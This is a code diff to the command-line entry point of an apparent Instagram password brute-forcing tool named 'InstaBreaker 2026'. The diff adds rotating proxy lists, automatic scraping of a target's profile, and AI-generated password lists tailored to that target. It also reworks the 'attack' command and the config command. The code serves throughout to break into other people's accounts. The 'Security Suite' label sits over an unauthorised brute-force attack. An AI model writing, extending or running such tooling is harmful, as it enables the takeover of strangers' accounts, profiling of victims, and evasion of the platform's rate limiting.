@@ -2,27 +2,33 @@ import asyncio
 import typer
 from typing import Optional, List
 from pathlib import Path
-from rich.progress import Progress
 
 from .utils.display import display
 from .utils.config import settings
 from .core.engine import BreakerEngine
 from .core.wordlist import WordlistGenerator
 from .core.session import SessionManager
+from .utils.scraper import ProfileScraper
+from .core.ai_engine import AIEngine
 
-app = typer.Typer(help="InstaBreaker 2026: A modern Instagram tool.")
+app = typer.Typer(help="InstaBreaker 2026 Ultra Edition: Advanced Instagram Security Suite.")
 
 @app.command()
 def attack(
     username: str = typer.Argument(..., help="Target Instagram username"),
     wordlist: Optional[Path] = typer.Option(None, "--wordlist", "-w", help="Path to wordlist file"),
-    proxy: Optional[str] = typer.Option(None, "--proxy", "-p", help="Proxy URL (e.g. http://127.0.0.1:8080)"),
-    ai: bool = typer.Option(False, "--ai", help="Use AI to generate wordlist"),
-    resume: bool = typer.Option(True, "--resume/--no-resume", help="Resume from last checkpoint if available"),
+    proxy_file: Optional[Path] = typer.Option(None, "--proxies", "-p", help="Path to proxies file"),
+    ai: bool = typer.Option(False, "--ai", help="Use AI to analyze profile and generate wordlist"),
+    resume: bool = typer.Option(True, "--resume/--no-resume", help="Resume from last checkpoint"),
 ):
-    """Start a brute-force attack against a target account."""
+    """Start an advanced brute-force attack."""
     display.banner()
     
+    proxies = []
+    if proxy_file and proxy_file.exists():
+        proxies = proxy_file.read_text().splitlines()
+        display.log(f"Loaded {len(proxies)} proxies.")
+
     passwords = []
     if wordlist:
         if wordlist.exists():
@@ -32,19 +38,28 @@ def attack(
             raise typer.Exit(1)
     elif ai:
         if not settings.openai_api_key:
-            display.error("OpenAI API key not set. Use 'instabreaker config --openai-key KEY' first.")
+            display.error("OpenAI API key not set. Use 'instabreaker config --openai-key KEY'.")
             raise typer.Exit(1)
-        profile_info = typer.prompt("Enter any known profile info (name, bio, interests, etc.)")
-        generator = WordlistGenerator()
+            
+        display.log(f"Scraping profile data for {username}...")
+        scraper = ProfileScraper()
+        profile_data = asyncio.run(scraper.scrape_profile(username))
+        
+        if not profile_data:
+            display.warning("Could not scrape profile data. AI generation might be less accurate.")
+            profile_data = {"username": username}
+            
         display.log("Generating AI wordlist...")
+        ai_engine = AIEngine()
         try:
-            passwords = asyncio.run(generator.generate_with_ai(profile_info))
+            passwords = asyncio.run(ai_engine.generate_wordlist(profile_data))
+            display.success(f"Generated {len(passwords)} AI-optimized passwords.")
         except Exception as e:
             display.error(f"AI generation failed: {e}")
             raise typer.Exit(1)
     else:
-        name = typer.prompt("Enter target's name")
-        year = typer.prompt("Enter target's birth year", default="")
+        name = typer.prompt("Enter target's name (if known)", default=username)
+        year = typer.prompt("Enter target's birth year (if known)", default="")
         generator = WordlistGenerator()
         passwords = generator.generate_from_template(name, year)
 
@@ -52,34 +67,41 @@ def attack(
         display.error("No passwords to test.")
         raise typer.Exit(1)
 
-    session_mgr = SessionManager(username)
-    start_index = 0
-    if resume:
-        start_index = session_mgr.load_checkpoint(username)
-        if start_index > 0:
-            display.log(f"Resuming from index {start_index}...")
-
-    display.log(f"Starting attack on {username} with {len(passwords)} passwords...")
+    engine = BreakerEngine(username, passwords, proxies=proxies)
     
-    engine = BreakerEngine(username, passwords, proxy=proxy)
-    
-    with Progress() as progress:
-        task = progress.add_task("[cyan]Attacking...", total=len(passwords))
-        progress.update(task, completed=start_index)
-        
-        def update_progress(n):
-            progress.update(task, advance=n)
-            
-        found = asyncio.run(engine.run(progress_callback=update_progress, resume=resume))
+    found = asyncio.run(engine.run(resume=resume))
 
     if found:
-        display.success(f"Attack successful! Password: {found}")
+        # The engine already logged success
+        pass
     else:
-        display.error("Attack failed. No password found or rate limited.")
+        display.error("\nAttack finished. No password found.")
+
+@app.command()
+def config(
+    openai_key: Optional[str] = typer.Option(None, "--openai-key", help="Set OpenAI API Key"),
+    timeout: Optional[int] = typer.Option(None, "--timeout", help="Set default timeout")
+):
+    """Manage configuration."""
+    if openai_key:
+        env_path = Path(".env")
+        lines = []
+        if env_path.exists():
+            lines = env_path.read_text().splitlines()
+        
+        new_lines = [l for l in lines if not l.startswith("OPENAI_API_KEY=")]
+        new_lines.append(f"OPENAI_API_KEY={openai_key}")
+        env_path.write_text("\n".join(new_lines))
+        display.success("OpenAI API Key saved to .env")
+    
+    # Show current config
+    display.log(f"OpenAI API Key: {'Set' if settings.openai_api_key else 'Not set'}")
+    display.log(f"Default Timeout: {settings.default_timeout}")
 
 @app.command()
 def generate_wordlist(
     output: Path = typer.Option(..., "--output", "-o", help="Output file path"),
+    username: Optional[str] = typer.Option(None, "--username", "-u", help="Target username for AI analysis"),
     ai: bool = typer.Option(False, "--ai", help="Use AI to generate wordlist"),
 ):
     """Generate a wordlist for later use."""
@@ -90,11 +112,24 @@ def generate_wordlist(
         if not settings.openai_api_key:
             display.error("OpenAI API key not set.")
             raise typer.Exit(1)
-        profile_info = typer.prompt("Enter any known profile info")
-        generator = WordlistGenerator()
+        
+        info = ""
+        if username:
+            scraper = ProfileScraper()
+            profile_data = asyncio.run(scraper.scrape_profile(username))
+            info = str(profile_data)
+        else:
+            info = typer.prompt("Enter any known profile info")
+            
+        ai_engine = AIEngine()
         display.log("Generating AI wordlist...")
         try:
-            passwords = asyncio.run(generator.generate_with_ai(profile_info))
+            # Reusing the generate_wordlist but it expects a dict if we use AIEngine
+            # or we can just use the prompt
+            if username:
+                 passwords = asyncio.run(ai_engine.generate_wordlist(profile_data))
+            else:
+                 passwords = asyncio.run(ai_engine.generate_wordlist({"bio": info}))
         except Exception as e:
             display.error(f"AI generation failed: {e}")
             raise typer.Exit(1)
@@ -127,29 +162,6 @@ def sessions(
         mgr = SessionManager(username)
         mgr.delete_session()
         display.success(f"Session for {username} deleted.")
-    else:
-        display.error(f"Unknown action: {action}")
-
-@app.command()
-def config(
-    openai_key: Optional[str] = typer.Option(None, "--openai-key", help="Set OpenAI API Key")
-):
-    """Manage configuration."""
-    if openai_key:
-        # Simple way to save to .env
-        env_path = Path(".env")
-        lines = []
-        if env_path.exists():
-            lines = env_path.read_text().splitlines()
-        
-        new_lines = [l for l in lines if not l.startswith("OPENAI_API_KEY=")]
-        new_lines.append(f"OPENAI_API_KEY={openai_key}")
-        env_path.write_text("\n".join(new_lines))
-        display.success("OpenAI API Key saved to .env")
-    else:
-        display.log(f"Config directory: {settings.app_dir}")
-        display.log(f"Sessions directory: {settings.sessions_dir}")
-        display.log(f"OpenAI API Key: {'Set' if settings.openai_api_key else 'Not set'}")
 
 if __name__ == "__main__":
     app()
